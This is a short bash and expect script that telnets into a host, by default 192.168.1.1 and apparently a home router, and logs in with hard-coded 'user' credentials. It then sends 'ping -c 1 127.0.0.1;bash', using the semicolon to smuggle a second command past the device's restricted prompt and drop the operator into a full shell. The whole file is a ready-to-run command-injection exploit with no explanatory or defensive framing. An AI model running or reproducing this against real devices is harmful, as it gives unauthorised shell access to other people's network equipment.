#!/bin/bash

if [ -z "$1" ]
  then
    host="192.168.1.1"
  else
  	host=$1
fi

(expect -c "
	set timeout 20
	spawn telnet $host
	expect \"Login:\"
	send \"user\r\"
	expect \"Password:\"
	send \"user\r\"
	expect \">\"
	send \"ping -c 1 127.0.0.1;bash\n\"
	interact
	exit
")